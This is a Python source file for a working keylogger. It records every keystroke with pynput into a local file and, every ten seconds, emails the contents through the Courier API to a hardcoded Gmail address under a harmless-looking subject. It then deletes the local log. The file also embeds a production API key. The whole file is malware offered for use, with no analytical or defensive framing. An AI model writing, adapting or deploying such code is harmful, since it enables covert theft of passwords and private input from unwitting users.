
from pynput.keyboard import Key
from pynput.keyboard import Listener
from time import sleep
from trycourier import Courier
import os
import threading
from utils.utils import *

TIME_DELAY_TO_SENT = 10
API_KEY = "pk_prod_FQTZ70SHDJMVA8GNGAW1PQV4MT9R"
OUTPUT_FILE_NAME = "keylog.txt"
TO_EMAIL = "hyquaq15@gmail.com"
TITLE_EMAIL = "Welcome to Courier!"
KEY_SPACE = ' '


def sentMail():
    while True:
        print(get_current_function_name())
        sleep(TIME_DELAY_TO_SENT)

        with open(OUTPUT_FILE_NAME, 'r') as file:
            data = file.read().replace('\n', '')

            if len(data) != 0:
                print("Time sent =", get_current_time())
                client = Courier(auth_token=API_KEY)

                try:
                    response_email = client.send_message(
                        message={
                            "to": {
                                "email": TO_EMAIL
                            },
                            "content": {
                                "title": TITLE_EMAIL,
                                "body": "KEYLOGGER: {{keylogger}}"
                            },
                            "data": {
                                "keylogger": data
                            },
                        }
                    )
                    os.remove(OUTPUT_FILE_NAME)
                except Exception as e:
                    print("Error sending email:", str(e))


def loggerr():
    print(get_current_function_name())

    the_keys = []

    def on_press(key):
        the_keys.append(key)
        storeKeysToFile(the_keys)
        # try:
        #     print('alphanumeric key {0} pressed'.format(key.char))
        # except AttributeError:
        #     print('special key {0} pressed'.format(key))

    def storeKeysToFile(keys):
        with open(OUTPUT_FILE_NAME, 'w') as log:
            for the_key in keys:
                the_key = str(the_key).replace("'", "")
                log.write(the_key)
                if the_key.startswith("Key"):
                    log.write(KEY_SPACE)

    def on_release(the_key):
        # if the_key == Key.esc:
        #     return False
        pass

    with Listener(
        on_press=on_press,
        on_release=on_release
    ) as the_listener:
        the_listener.join()


t1 = threading.Thread(target=sentMail, args=[])
t2 = threading.Thread(target=loggerr, args=[])
t1.start()
t2.start()
